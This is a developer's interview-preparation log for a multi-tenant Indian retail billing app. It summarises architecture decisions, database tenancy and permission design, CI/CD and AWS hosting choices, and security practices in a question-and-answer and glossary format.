# Interview log

A running record of everything that happens while building this project: decisions, concepts, bugs, errors, commands and small gotchas. It is written so I can revise before an interview. Claude adds entries during every session (rule in `CLAUDE.md`), and I can add my own.

**How to revise:** read the Pitch and Numbers, then the Question bank, then skim the Log for stories. Search by tag, e.g. `#database`.

**Tags:** `#product` `#requirements` `#process` `#git` `#github` `#architecture` `#database` `#security` `#money` `#gst` `#frontend` `#backend` `#testing` `#devops` `#cloud` `#cost` `#ai` `#mistake` `#gotcha`

The phase journals (`phase-N.md`) are the short story of each phase. This file is the detailed diary behind them.

---

## Pitch

Update this as the project grows.

**30 seconds:** I'm building a multi-tenant web app, in English, Hindi and Hinglish, that runs an Indian retail shop: GST billing, inventory, customer credit (udhaar), staff attendance with salary and advances, an audit log, alerts on WhatsApp, and an AI assistant that answers questions about the shop's own data. The focus is correctness: nothing is ever deleted, a bill and its stock change save together or not at all, and each business's data is kept apart by the database itself. I also used it to learn DevOps: Docker, CI/CD with GitHub Actions, Terraform and AWS.

**2 minutes** (written at the end of Phase 0; update "where it stands" and "how it's shipped" as phases finish):

- **The problem:** a small Indian shop runs on a billing app, a paper udhaar register and a staff notebook. I'm building one web app that does all of it, for many shops at once, each seeing only its own data, in English, Hindi and Hinglish.
- **What makes it hard:** correctness, not the feature list. A bill must save the invoice, the stock change and the udhaar entry together or not at all. Two counters can sell the last unit at the same moment. GST maths must be exact to the paisa. And the owner can't lose a single record.
- **My architecture:** a TypeScript monorepo with a React single-page app, a NestJS modular monolith (so a bill is one database transaction, not a saga across services) and PostgreSQL. The safety rules live in the database, not only in my code: money is stored as whole paise, the app's database user has no DELETE permission, and Row-Level Security keeps businesses apart. Every choice has a written decision record with the alternatives I rejected; there are 41 so far.
- **One hard bug:** my background worker kept dying after exactly 10 seconds. That was the database driver's idle timeout. Waiting for the shutdown signal doesn't keep Node's event loop alive, so when the pool's last idle connection closed, the process simply ended. I reproduced it in a test, held the process open until SIGTERM, and confirmed it in Docker with zero restarts.
- **How it's shipped:** the same Docker Compose stack runs on my laptop and in CI. Every pull request must pass five required checks: lint, types and 1,576 tests against a real PostgreSQL; a secret scan of the whole history; a migration-order check; the PR title; and a smoke test that starts the real images. The cloud is Terraform on AWS in Mumbai: one ARM64 EC2 server plus RDS PostgreSQL with point-in-time restore, no SSH (Systems Manager only), priced at about 4 cents per running hour and run only for sessions and demos, because my budget is ₹0. CI also checks the Terraform on every PR. Every commit on `main` gets ARM64 images on GHCR, tagged by its hash, and the demo at https://business-software.duckdns.org deploys one commit at a time over Systems Manager. A merge to `main` starts a deploy that waits for my approval in a GitHub environment, signs in to AWS through OIDC with no stored key, takes a backup first and rolls back on a failed health check.
- **Where it stands:** the foundations are done (Phase 0). In Phase 1 the database already keeps businesses apart (forced Row-Level Security, with a test that scans every table), and an append-only audit log records every change in the same transaction. The GST engine computes every number on a bill; a shop can sign up, owners and staff log in (hashed sessions, a lock screen, CSRF, rate limits), and the owner manages items with barcodes. The database is backed up nightly to S3 by a read-only role, into a bucket that refuses overwrites, with a restore drill. Billing comes next.
- **What I'd do differently:** pin down the real constraints first. I designed hosting for a budget I didn't have and had to redesign it. And test what you ship: the production CSS minifier broke a page my unit tests said was fine.

---

## Numbers to remember

| What | Value | Where it comes from |
| --- | --- | --- |
| Max data loss in a disaster (RPO) | 5 minutes | RDS point-in-time restore — `product-overview.md` NFR 1 |
| Max time to recover (RTO) | 1 hour | Restore runbook + monthly drill |
| Scanned item appears on screen | < 200 ms | NFR 5 |
| Bill save | < 1 second | NFR 5 |
| Cloud budget | ₹0: AWS Free plan, $100 credits now + up to $100 from 5 activities, until 2027-05-17; Region Mumbai `ap-south-1` (Sydney 2026-11-12 to 11-17 in the first account) | ADRs 0011, 0033 |
| Hosting cost (Mumbai) | $0.0372 per running hour + $4.44 a month for disks: ≈ $6.70 a month at ~60 h, ≈ $31.60 at 24/7 (Sydney was $0.0512 + $4.73) | ADRs 0011, 0032, 0033 |
| Latency, India → the server | Mumbai ~55–80 ms per round trip (Sydney was ~270–300 ms, the reason to move) | ADRs 0032, 0033 |
| Money stored as | whole paise (₹12.50 = 1250) | ADR 0008 |
| Largest exact amount in JavaScript | ≈ ₹90 lakh crore in paise (2^53) | ADR 0008 |
| Business types in v1 | 5 | Module 00 |
| Modules | 10 (00–09) | `docs/requirements/` |
| ADRs | 46 (16 at kickoff) | `docs/decisions/` |
| Secrets found before going public | 0, in 5 commits (gitleaks, full history) | ADR 0017 |
| Automated tests | 1,610 (2026-11-21, after Day 4): 876 shared, 208 db (roles, tenancy, entry log, guard, backups and restore, items, sessions, auth tokens, stock ledger and two-counter tests), 255 api (signup, login, resets, sessions, settings, items, stock, routes), 271 web (signup, login, resets, lock screen, items page, settings, three languages, contrast, stock screens); plus 41 deploy-script checks | `pnpm test` |
| Interface languages | 3: English, Hindi, Hinglish (`en`, `hi`, `hi-Latn`) | Module 00 #25, ADR 0023 |
| Web app download | ~160 KB gzipped JavaScript; fonts 307 KB (woff2, six files, cached for a year); web image 95 MB (Caddy) | P0.7, `vite build` |
| Readability floor | text ≥ 4.5:1 contrast (main text ≥ 7:1), input edges and focus ring ≥ 3:1, both modes; body text 15 px, nothing under 13 px | ADR 0025 |
| PostgreSQL version | 18, everywhere (newest RDS supports) | ADR 0005, `compose.yaml` |
| Integration test run | ~3 s with the image cached, ~22 s on the first run | P0.3 |
| How long a new package version waits before we install it | 1 day | `pnpm-workspace.yaml` `minimumReleaseAge` |
| API Docker image | 375 MB, of which the app is 40 MB (the rest is `node:24-slim`) | P0.4 |
| First image build on a slow connection | ~12 minutes (later builds reuse the cached install layer) | P0.4 |
| Clean stop of api and worker | ~0.7 s, exit code 0 | P0.4 |
| CI checks on every pull request | 5 required: `check`, `secrets`, `migrations`, `smoke`, `pr-title` | ADR 0024 |
| CI run time | ~3 min in all; `check` (lint, types, tests, build) about 50 s when measured with 130 tests; `smoke` 2 min 47 s with an empty cache, 50 s warm | P0.6 |
| Tenancy guard | 11 rules on every table and view in every app schema, plus 2 function rules and a role-membership check, proven by 28 probes (each breaks one rule; a few are correct and must pass); tables `businesses`, `branches`, `entry_log` | P1.1–P1.2, ADRs 0027, 0028 |
| Entry log | append-only: `app_runtime` may only INSERT and SELECT; one write helper, `recordEntry(tx, …)` | P1.2, ADR 0028 |
| Phase 0 (foundations) | 3 days (2026-10-29 to 31), 9 work sessions, 7 pull requests, 0 business features on purpose | `phase-0.md` |
| How often the screen checks the server | every 30 s, 10 s timeout (the API waits 5 s for the database) | P0.5, ADR 0001 |
| Live demo | https://business-software.duckdns.org: HTTPS (Let's Encrypt), page in ~0.12 s from India, back 73 s after a start on a new IP | Stage 5, ADR 0034 |
| Demo server memory | 773 MB used of 1.8 GB with the whole stack running (containers ~100 MB) | Stage 5 part 3 |
| Password hashing | Argon2id, 19 MiB, 2 passes, 1 lane (OWASP), ~30 ms and ~19 MiB per hash | ADR 0035 |
| Recovery key | 160 random bits, 32 Crockford base32 characters, stored as SHA-256 | Module 00 #31 |
| Backups | nightly at 22:45 IST (or at the next boot), kept 90 days + 30 days as old versions; can't be overwritten; under $0.10 a month | Stage 7, ADR 0037 |
| Wrong-password limit | 10 per login per 15 minutes, 30 per computer; at most 2 Argon2 hashes at once | P1.4, ADR 0038 |
| Review findings before merge, Day 3 | 39 across 4 PRs (10 + 9 + 10 + 10), all fixed test-first; CI was green on every one | Fast track Day 3 |
| Review findings before merge, Day 4 (first half) | 32 across 3 PRs (stage 6: 10 + 8 over two reviews; P1.4 PR 2: 10; P1.8 PR 1: 4); fixed test-first or answered with reasons | Fast track Day 4 |
| Database timeouts | lock 3 s, statement 10 s, idle in transaction 15 s; a lock timeout answers `503` with `Retry-After: 1` | ADR 0041 |
| Email cost | Amazon SES, Mumbai: $0.10 per 1,000 emails, nothing while idle; sandbox = verified addresses only | ADR 0040 |
| Deploy role | 3 IAM resources (OIDC provider, role, policy), $0; one GitHub environment with a required reviewer and `main` only | Stage 6, ADR 0012 note |
| First deploy and restore drill | 2026-11-21: release `794fd1f` live after the zone move and the OIDC fix; first backup 87 KB, drill OK on 18 tables (every row count matches); the first normal deploy (backup, deploy, live check) green the same hour | ADRs 0012, 0037, 0042 |

---

## Question bank

Short answers; the Log entry has the full story.

- **Q: Why a modular monolith and not microservices?**
  A: A bill must save the bill, stock change, udhaar entry and audit log in one database transaction. In one process with one database that's a single `BEGIN…COMMIT`. With microservices it needs sagas and compensation, which is overkill for one developer. → ADR 0004
- **Q: How do you keep one business from seeing another's data?**
  A: Every row has a `business_id`, and PostgreSQL Row-Level Security filters every query by the business set for the current transaction. Even if my code forgets a `WHERE`, the database refuses. Tests try cross-business reads on purpose. → ADR 0006
- **Q: Two counters sell the last unit at the same moment. What happens?**
  A: Both run inside transactions that lock the stock row. The second waits for the first, then sees the updated number. Invoice numbers come from a locked counter row, so there are no duplicates or gaps. → ADR 0007
- **Q: The network drops while a bill is saving. Is it saved twice?**
  A: No. The screen sends an idempotency key with the bill. If it retries, the server sees the key already used and returns the original bill. → ADR 0007
- **Q: Why not store money as a decimal number?**
  A: Floating point can't represent 0.1 exactly (0.1 + 0.2 = 0.30000000000000004). I store whole paise as integers, so every sum is exact, and rounding happens in one tested place. → ADR 0008
- **Q: Why sessions and not JWTs?**
  A: When a staff member leaves, or the owner's screen locks, access must stop immediately. A session in the database can be revoked at once. A JWT stays valid until it expires. → ADR 0009
- **Q: How do you make sure a WhatsApp alert isn't lost if the server crashes?**
  A: The outbox pattern. The alert is written to a table in the same transaction as the business action, and a worker sends it later with retries. Commit means the message will go out; rollback means it never existed. → ADR 0010
- **Q: How does the AI avoid making up numbers or leaking salaries?**
  A: It can't query the database. It can only call a fixed set of my own functions, which run with the asking user's permissions. Every number in an answer comes from a function result. → ADR 0015
- **Q: How does CI deploy to AWS without storing AWS keys in GitHub?**
  A: OIDC. GitHub proves its identity to AWS for each run and gets short-lived credentials for one IAM role, so there's no long-lived secret to leak. → ADR 0012
- **Q: How did you host it with no budget?**
  A: AWS Free plan credits, and a design sized to them: one EC2 server running the same Docker Compose stack as my laptop, plus RDS for managed backups. I skipped the load balancer, NAT gateway and ECS, which would have used the credits in about 4 months. Everything is Terraform, so moving to ECS later is an infrastructure change only. → ADR 0011
- **Q: Why not just use the AWS root user?**
  A: Root can do anything, including closing the account, and no policy can limit it, so a leaked root password is the worst possible leak. My plan was MFA on root and daily work as an IAM user (ADR 0029). The account I actually got came from AWS's new sign-up flow: I sign in through my identity provider into a project, MFA lives on that identity, and IAM users are only for programs. → ADR 0030
- **Q: Why an IAM user and not IAM Identity Center?**
  A: Identity Center's account access needs AWS Organizations, and joining Organizations upgrades a Free plan account to Paid, which can't be undone. That's why I first planned an IAM user with MFA (ADR 0029). AWS's new sign-up flow then made it moot: people sign in through the project's Team page, and AWS manages the structure behind it. → ADR 0030
- **Q: Why was your server going to be in Sydney and not Mumbai?** (History: since 2026-11-17 it is in Mumbai, in a new account that isn't locked to a Region, ADR 0033.)
  A: My first Free plan project was locked to the Region AWS assigned, Sydney. Mumbai needs the Paid plan plus "advanced features", which can't be undone and can charge my card. My budget is zero, so I accepted about 0.2 s more per round trip (measured) for a demo, and wrote down that real shop data would need the Region question reopened. → ADR 0030
- **Q: How do you make sure the cloud doesn't cost you money?**
  A: On the Free plan AWS can't charge the card; it closes the account when credits run out. So the risk is burning credits early. I have a monthly budget that excludes credits (by default AWS subtracts them, so a normal budget shows $0 while credits drain), alerting at $5, $10, $15 and on forecast. I also stop the server and database when idle and state each resource's cost before Terraform creates it. → ADR 0030
- **Q: How do you and your AI assistant get into AWS without access keys?**
  A: `aws login` gives my laptop 12-hour credentials from my console sign-in (MFA on my identity), renewed for up to 90 days, and Terraform's provider reads them natively. Every command names the profile and the provider pins the allowed account ID, because my laptop once had a live key for another project as its default. CI will use OIDC with its own narrow role. → ADR 0031
- **Q: Why no Elastic IP on your server?**
  A: An Elastic IP bills every hour, even while the server is stopped, and mine is stopped most of the time. The auto-assigned address is released on stop and costs nothing then; the server updates a free DuckDNS name at boot, so the address can change. → ADR 0032
- **Q: What's RPO and RTO for your app?**
  A: RPO is how much data you can lose (5 minutes, thanks to point-in-time restore). RTO is how long recovery takes (1 hour, checked by a monthly restore drill). → `product-overview.md` NFR 1
- **Q: Why did you test against a real database instead of mocks?**
  A: The bugs I care about (locks, concurrency, Row-Level Security) only exist in the real database. Testcontainers starts a throwaway PostgreSQL for each test run. → ADR 0013
- **Q: What's your branching and merge strategy?**
  A: GitHub flow. Each task is a short-lived branch, merged into a protected `main` by pull request. I squash-merge, so each PR becomes one Conventional Commit on `main`: history reads like a changelog, and one `git revert` undoes a whole feature. → ADR 0017
- **Q: Merge commit vs squash vs rebase?**
  A: A merge commit keeps every commit plus an extra merge commit, so history branches. Rebase replays every commit on top of `main`: linear, but work-in-progress commits land too. Squash turns the branch into one commit: linear and clean, and the details stay in the PR. → ADR 0017
- **Q: How do you keep secrets out of git?**
  A: Secrets live in environment variables, and `.gitignore` blocks `.env` files and keys. GitHub push protection rejects pushes containing known token formats. I scanned the full history with gitleaks before making the repo public, and CI runs it on every PR. If a secret ever leaks, I revoke it first, because deleting the commit doesn't remove the copies. → ADR 0017
- **Q: Why a monorepo?**
  A: The web app and the API share types, validation and money/GST code. In one repo that code lives once in `packages/shared`, and a change to it is checked against both sides in the same pull request. pnpm workspaces link the packages; a catalog keeps tool versions identical across them.
- **Q: How do you turn a typed "0.29" into paise without floating-point errors?**
  A: I never multiply the decimal. `0.29 * 100` is `28.999999999999996` in JavaScript. I split the text at the dot and do integer maths on the two parts, and anything that isn't plainly an amount (commas, `₹`, three decimals) is refused rather than guessed. → ADR 0008
- **Q: How do you defend against a malicious npm package?**
  A: The lockfile pins exact versions and checksums; pnpm blocks dependencies' install scripts unless I approve them; it won't install a version less than a day old, which is when most hijacked releases are caught; Dependabot alerts on known vulnerabilities.
- **Q: How do you know your checks actually catch problems?**
  A: I planted one deliberate error per check (a type error, a Node-only API in shared code, an `any`, an unawaited promise, bad formatting) and confirmed each command failed. A check that has never failed proves nothing.
- **Q: What's the difference between an image, a container and a volume?**
  A: An image is a read-only recipe (PostgreSQL 18 plus everything it needs). A container is a running copy of an image, and it's disposable. A volume is storage kept outside the container, so the data survives when the container is deleted. My database's data lives in a named volume. → ADR 0019
- **Q: How do you stop a bug in your code from deleting business data?**
  A: The app logs in as a database role that has no `DELETE` permission. A separate owner role runs migrations. Default privileges give every new table select, insert and update to the app role and nothing more, and an integration test proves delete, truncate, create and drop are all refused. → ADR 0019
- **Q: How do you make sure local, CI and production run the same database?**
  A: The PostgreSQL major version is written once, in `compose.yaml`. My integration test reads the image from that file, and Terraform will pin the same major version for RDS. → ADRs 0005, 0019
- **Q: How does a command-line tool log in to GitHub without your password?**
  A: The OAuth device flow. The tool gets a short code from GitHub, I approve that code in a browser where I'm already logged in, and the tool receives a token. Only enter codes your own device generated: entering someone else's code logs their device into your account.

- **Q: What's the difference between liveness and readiness?**
  A: Liveness says the process is alive, so there's no point restarting it. Readiness says it can do its job, here meaning the database answers. My API has `/api/health` (liveness, used by Docker's healthcheck) and `/api/health/ready` (503 when the database is down). Restarting the API wouldn't fix a database outage, so the restart check mustn't depend on the database. → ADR 0020
- **Q: How do you run database migrations in production?**
  A: A one-shot container from the same image runs them as the schema-owner role, and the app containers start only after it exits successfully. New code never meets an old schema, and the long-running app can't change the schema. → ADR 0021
- **Q: How do you stop secrets leaking from a public repo?**
  A: Five places: git (gitignore, gitleaks, push protection), images (secrets only arrive at container start, checked with `docker history`), the browser bundle (never a `VITE_` secret), CI (no secrets for fork PRs) and logs (messages only: pg-pool can attach the client, whose hidden password some serializers print, and Drizzle messages carry query values). → `docs/devops/secrets.md`
- **Q: How does your frontend call the API without CORS?**
  A: Same origin. Vite's dev server proxies `/api` in development, and Caddy serves the built files and reverse-proxies `/api` in Docker and on the server. The browser only calls relative `/api` URLs, so it needs no configuration and can't leak a secret through a `VITE_` variable. → ADR 0023
- **Q: How do users get a new deploy straight away while files are still cached?**
  A: Content-hashed file names. `/assets/*` is cached for a year as `immutable`, because a changed file gets a new name. `index.html` is `no-cache`, so the next load picks up the new names. Missing assets are a real 404 with `no-store`, never `index.html`. → ADR 0023
- **Q: What is a Content-Security-Policy and what does yours allow?**
  A: A header telling the browser where scripts, styles and requests may come from. Mine is `default-src 'self'` with no inline scripts, so an injected script can't run or send data elsewhere. I checked the built app in headless Chrome for violations, and error responses carry the header too. → ADR 0023
- **Q: How do you handle three languages, one of them Hindi in Latin letters?**
  A: i18next with `en`, `hi` and `hi-Latn` files. Keys are type-checked against English. Tests check that every file has the same keys, Hindi is Devanagari and Hinglish never is. `load: 'currentOnly'` stops Hinglish falling back to Devanagari. → ADR 0023
- **Q: How do you choose timeouts across layers?**
  A: Each caller waits longer than what it calls. The API waits 5 s for the database, so the browser waits 10 s. Otherwise a database outage can be reported as "server down", depending on which timer fires first. A test pins the relationship.

- **Q: What does your CI pipeline check?**
  A: Five required checks on every PR: lint, types, all tests against a real PostgreSQL and the build; a gitleaks scan of the whole history; a check that a new migration is newer than `main`'s (Drizzle skips older ones); the PR title; and a smoke test that builds the real images with a layer cache, starts them with Compose and checks headers, a failing migration and clean shutdowns. → ADR 0024
- **Q: How do you secure a GitHub Actions workflow?**
  A: Read-only token permissions, actions pinned to commit SHAs (tags can be moved, as in the tj-actions attack), no `pull_request_target`, no secrets in CI at all, `persist-credentials: false`, and event values like a PR title passed through `env:` rather than `${{ }}` inside a script, which would be script injection. → ADR 0024
- **Q: How do you know a CI check actually works?**
  A: I made each one fail on purpose: a badly formatted line, a fake API key, a wrong expected header and a bad PR title. I did it on a throwaway branch, because a fake secret committed to the real branch would stay in history and fail every later scan. → P0.6
- **Q: How did you make "easy to read" testable?**
  A: Design tokens live in one CSS file, and a test reads them and checks WCAG contrast for every text and edge colour in light and dark mode. On its first run it rejected two colours from the palette the owner had approved. → ADR 0025
- **Q: How do your keyboard shortcuts coexist with a barcode scanner and a Hindi keyboard?**
  A: Inside text fields only F-keys, Esc and Ctrl/Alt combos fire, because the scanner types there. Letters match `event.code`, the physical key, so Alt+H works whatever the layout types. Auto-repeat, IME composition and AltGr never fire. → ADR 0026
- **Q: You spent a whole phase without building a feature. Why?**
  A: Tenancy, the no-delete permissions, migrations and CI are hard to add once business tables and data exist. Built first, every business table gets `business_id`, Row-Level Security and no DELETE from its first migration, and since P0.6 every change has had to pass the same five checks. → `phase-0.md`
- **Q: Your app sets the tenant per transaction. What happens to a pooled connection afterwards?**
  A: The setting is transaction-local (`set_config(…, true)`), so it ends with the transaction. But on that connection it then reads back as an empty string, not NULL, and `''::uuid` throws. My policy function turns empty into NULL, so a connection with no business set sees no rows instead of crashing. A test reuses a one-connection pool to prove it. → P1.1
- **Q: Can Row-Level Security alone stop one tenant's row pointing at another tenant's data?**
  A: No. Foreign-key checks skip RLS, so with a plain `branch_id → branches(id)` key, business B could save a row pointing at A's branch. Every key between tenant tables is composite, `(business_id, branch_id) → branches(business_id, id)`, and a guard test refuses any that isn't. → ADR 0027
- **Q: How do you make an audit log that nobody can tamper with?**
  A: The app's database role gets only INSERT and SELECT on it: I `REVOKE UPDATE`, and DELETE and TRUNCATE were never granted. A test proves each fails with `42501`. The write helper takes a transaction, not the database, so a log row always commits or rolls back with the change it describes. → ADR 0028
- **Q: Why store old and new values as two JSON columns instead of one row per field?**
  A: One action stays one row (a 20-line bill would otherwise be a pile), and the writer doesn't compute a diff, so a bug can't silently corrupt history. The viewer diffs `before` and `after` when it shows them. → ADR 0028
- **Q: Your app's role has no UPDATE on the log. Is that enough?**
  A: No. Three other routes reopen it: a column-level UPDATE grant (`has_table_privilege` says no, `has_any_column_privilege` says yes), a plain view (it checks the base table's rights as the view's owner, who owns the log), and a `SECURITY DEFINER` function the app may call. My guard checks all three: column privileges, `security_invoker` on every view, and an allowed list for definer functions. → ADR 0028
- **Q: What's the difference between a type check and a runtime check, in your log helper?**
  A: `actorId: string | null` makes leaving out "who" a compile error for typed code. Untyped code (a request object typed `any`) could still pass `undefined`, which the ORM stores as NULL, meaning "the system", so the helper also throws at runtime. → ADR 0028
- **Q: How does a shop owner recover a forgotten password with no phone app?**
  A: An emailed reset link, once the email is confirmed, plus a recovery key printed at signup, for when the email account itself is lost. I rejected SMS OTP: every message costs money, and in India the sender must first register on the DLT system. Staff passwords are simpler, because the owner resets them. → Module 00 #30–#33
- **Q: What happens to your API if the database restarts while a request is running?**
  A: That request fails with a 500 and the process stays up. It used to crash: pg-pool listens for `error` only on idle connections, a transaction holds a checked-out one, and Node kills a process on an `error` event with no listener. I attach a listener to every connection the pool opens, and a test terminates the backend mid-transaction to prove it. → `packages/db/src/client.ts`
- **Q: How do you keep personal data out of your logs?**
  A: I log messages, never error objects. A failed query's error carries its values and PostgreSQL's `detail` line, and my framework's default handler logs the whole object. I replaced it with a filter that writes one line and answers a generic 500, and I handle uncaught exceptions and unhandled rejections the same way before exiting. → `docs/devops/secrets.md`
- **Q: Your `try/catch` wraps `main()`. Which errors does it miss?**
  A: A rejected promise nobody awaited and an `error` event nobody listens to. Neither travels up the call stack. Node reports them on `process` as `unhandledRejection` and `uncaughtException`, so I handle them there: log, exit 1, let Docker restart a clean process. → `apps/api/src/run.ts`
- **Q: With Row-Level Security forced on everyone, how does a background worker find work?**
  A: It can't by itself: with no tenant set it sees zero rows, even of the tenants table. I plan one narrow `SECURITY DEFINER` function that returns only IDs of pending work, on an allowed list my guard test checks, and the worker then enters each tenant with the normal `withBusiness`. → PROGRESS P2.7
- **Q: Where does Terraform keep its state, and what stops two runs at once?**
  A: In an S3 bucket with versioning, encryption, no public access and a policy that refuses plain HTTP. Locking is S3's own lock file (`use_lockfile`), so there's no DynamoDB table. A tiny bootstrap root creates the bucket with local state first, then its state is migrated into the bucket it made.
- **Q: The database password has to exist somewhere. Is it in your Terraform state?**
  A: No. An ephemeral `random_password` exists only while Terraform runs, and it's passed through write-only arguments to RDS and to an SSM SecureString. Terraform can't see a value it never stored, so a version number tells it when to send a new one.
- **Q: How do you get a shell on a server with no SSH key and port 22 closed?**
  A: AWS Systems Manager Session Manager. The server's agent makes an outbound HTTPS connection, so nothing listens for inbound logins, access is an IAM permission and sessions can be logged.
- **Q: You changed AWS accounts mid-project. What did that cost?**
  A: A sign-in, a new budget and doc updates. The infrastructure was code with no account ID in it, and nothing had been applied yet. The provider's `allowed_account_ids` then pins the new account, so the old one can't be touched by accident.
- **Q: You had to deliver much faster. How did you keep quality?**
  A: I parallelised the work, not the checks. A dependency graph gave the critical path, independent tasks ran in separate git worktrees, decisions were batched up front, and merges went through one queue with a rebase and a full re-check each time. 
- **Q: How do you stop two accounts for one email when text can look identical?**
  A: Uniqueness is only as good as the comparison. Zero-width spaces and look-alike letters made a second owner for one mailbox, so login emails are printable ASCII only, checked in the shared schema and by a database CHECK under the unique index.
- **Q: CI fails but it passes on your machine. What do you do?**
  A: Ask what my machine has that a clean checkout doesn't. Here it was an old build of a workspace package; moving `dist/` aside reproduced CI in one command, and one test-config line fixed it.
- **Q: How do you deploy without SSH?**
  A: A script sends a Systems Manager Run Command. The server downloads the repo at one commit hash, installs that commit's files and pulls that commit's images, so what runs is identified by one hash.
- **Q: How do you make sure written requirements match what the client decided?**
  A: Every requirement file gets a review before merge from someone without the conversation's context, checking each point against the client's actual answers. Additions are labelled as additions and confirmed. On my project that review caught a rule nobody had chosen and a note contradicting a newer decision.Every PR still had tests first, an independent review and five green CI checks. → `docs/plans/2026-11-17-fast-track.md`

- **Q: How do you back up a database whose rows are hidden by row-level security?**
  A: A read-only `app_backup` role with its own policy on every tenant table; CI fails if a table lacks it, and the dump script refuses to run if the live database does. The RDS master can't bypass RLS, so it can't do it. → ADR 0037
- **Q: How did you run several tasks at once on your own?**
  A: One git worktree, branch and PR per task, each worked by a background agent; one merge queue where the second PR to merge updates from `main`, renumbers its migration and re-runs CI; a code review on every PR before merge. → `docs/plans/2026-11-17-fast-track.md`
- **Q: How does a merge reach your server, and who can stop it?**
  A: A merge to `main` builds and tests ARM64 images, then a deploy job names a GitHub environment that only accepts `main` and needs my approval. It signs in to AWS through OIDC (no stored key), sends one Run Command naming the commit, checks health and rolls back if it fails. A repository variable is a kill switch: anything but `off` stops it before AWS. → ADR 0012, stage 6
- **Q: Two counters sell the last unit at the same moment. What happens?**
  A: Each sale locks the item's stock row with `SELECT … FOR UPDATE`, always in item-ID order so two bills can't deadlock. The second waits, then sees the new quantity and is warned or blocked by the business's rule. A lock wait over 3 s answers `503` and the screen retries once with the same idempotency key. → ADR 0041, P1.8
- **Q: Your server couldn't start because AWS had no capacity. What did you do?**
  A: Stopping a server gives its hardware back, and `t4g.small` in my zone wasn't there for two days. The server keeps no state, so I kept the type and moved it to the zone the database is in, a one-line Terraform change; a capacity reservation would have billed while idle. → ADR 0042
- **Q: Why did a pull request show no CI checks at all?**
  A: It had a merge conflict with `main`. GitHub runs pull-request checks on a test merge with `main`, and with a conflict there is no merge to test. Merging `main` into the branch and pushing started them.
- **Q: Your deploy job got `Not authorized to perform sts:AssumeRoleWithWebIdentity`. How did you debug it?**
  A: Compared the claim AWS checks with what GitHub sends. The live trust policy wanted `sub = repo:owner/name:environment:demo`; GitHub's subject setting showed the repo uses the immutable form with owner and repository IDs. One Terraform variable, one IAM update, still an exact match. → ADR 0012 note (2026-11-21)
- **Q: How do you know your backups work?**
  A: A drill restores the newest dump into a throwaway PostgreSQL on the server, as an admin with only the RDS master's rights, and compares every table's row count with the counts saved at backup time. First run 2026-11-21: 18 tables, all matching. → `docs/devops/backup-restore.md`

---

## Glossary

Terms I learned on this project, in one line each.

| Term | Meaning |
| --- | --- |
| ACID | Transactions are Atomic (all or nothing), Consistent, Isolated (don't see each other's half-work), Durable (survive crashes) |
| ADR | Architecture Decision Record: a short file explaining one technical choice and why |
| Argon2id | A deliberately slow password-hashing algorithm, recommended by OWASP |
| BCP 47 | The standard for language tags: `hi` is Hindi, `hi-Latn` is Hindi written in Latin letters (Hinglish) |
| BOM | Byte-order mark: invisible bytes at the start of a text file; JSON parsers reject it, and PowerShell 5.1's "utf8" adds it |
| Cache busting | Putting a hash of a file's content in its name, so a changed file gets a new URL and old copies can be cached forever |
| Catalog (pnpm) | One list of dependency versions in `pnpm-workspace.yaml` that every package refers to with `"catalog:"` |
| Branch protection: up to date | A rule that a PR must contain the latest `main` before merging, so its checks ran against what it will actually join |
| `event.code` vs `event.key` | `code` is the physical key (`KeyH`), `key` is the character it types (`h`, or `ह` on a Hindi layout); shortcuts on letters should use `code` |
| CI / CD | Continuous Integration (test every change automatically) / Continuous Deployment (ship every green change automatically) |
| Container | A running, disposable copy of an image, isolated from the rest of the computer |
| Conventional Commits | Commit messages shaped `type(scope): summary`, e.g. `fix(gst): round CGST and SGST separately` |
| CDP | Chrome DevTools Protocol: JSON over WebSocket for controlling Chrome; Puppeteer and Playwright are built on it |
| CSP | Content-Security-Policy: a response header listing where the page may load scripts, styles and data from; anything else is refused |
| CSRF | A trick where another site makes your browser send a request with your cookies; blocked with SameSite cookies + tokens |
| Database role | A PostgreSQL login (or group) with its own permissions; here `app_owner` runs migrations, `app_runtime` is the app |
| Decorator metadata | Type information a compiler attaches to decorated classes; NestJS reads it to know what to inject |
| Default privileges | PostgreSQL rules that grant permissions on tables automatically when they're created later |
| Design token | A named design value (`--surface`, `text-body`) that every screen uses instead of a raw colour or size, so the look changes in one place |
| Device flow | OAuth login for CLIs and TVs: the device shows a short code, you approve it in a browser where you're logged in |
| Docker Compose | One YAML file describing several containers, their settings and volumes, started with one command |
| Docker daemon | The background engine that builds and runs containers; the `docker` command only sends it requests |
| Exit code 143 | 128 + 15: the process ended because of SIGTERM rather than exiting by itself |
| Export conditions | Named entry points in a package's `exports` (`source`, `types`, `default`); each tool picks the one it understands |
| Fast refresh | Vite swapping a changed React component into the running page without a reload, keeping its state |
| FEFO | First Expiry, First Out: sell the batch that expires soonest |
| FOUC | Flash of unstyled (or wrong-theme) content: the page draws once before styles or the saved theme apply |
| GitHub flow | `main` is always deployable; every change is a short-lived branch merged by pull request |
| Healthcheck | A command Docker runs repeatedly to decide whether a container is ready, not just started |
| httpOnly cookie | A cookie JavaScript can't read, so a script injected into the page can't steal the session |
| IaC | Infrastructure as Code: cloud resources created from code files (Terraform) instead of clicking in a console |
| IME composition | An input method (e.g. phonetic Hindi) builds a word from several keys; those keydowns have `isComposing` set and aren't commands |
| Idempotency key | A unique ID sent with a request so repeating it has the same effect as sending it once |
| Image (Docker) | A read-only package of a program and everything it needs; containers are started from it |
| Liveness / readiness | "The process is alive" vs "it can serve requests now" (its dependencies answer) |
| Migration | A numbered SQL file that changes the database schema, applied once per database and tracked |
| Modular monolith | One deployable app split internally into modules with clear boundaries |
| Monorepo | One git repository holding several packages (here: web app, API, shared code) that are developed together |
| Multi-stage build | A Dockerfile with a build stage (tools, compilers) and a slim final stage that copies only the result |
| OIDC | OpenID Connect: lets one system prove its identity to another and get short-lived credentials |
| One-shot container | A container that does one job and exits, like `migrate`; `Exited (0)` means success |
| ORM | A library that maps database tables to code (Drizzle here) |
| Outbox pattern | Write "send this message" into the database in the same transaction, send it later from a worker |
| Peer dependency | A package that a plugin needs but expects you to install, in a version range it supports (typescript-eslint needs TypeScript) |
| PID 1 / init | The first process in a container; it receives Docker's stop signal. `init: true` adds a tiny init that forwards signals |
| PITR | Point-in-time restore: rebuild the database as it was at any second in the retention window |
| Project references | TypeScript's way to build several packages in dependency order, incrementally (`tsc -b`) |
| Proxy (dev) / reverse proxy | A server that takes the browser's request and forwards it to another server (here `/api` → the API), so the browser sees one origin |
| Push protection | GitHub rejects a `git push` that contains a known secret format, before it reaches the repo |
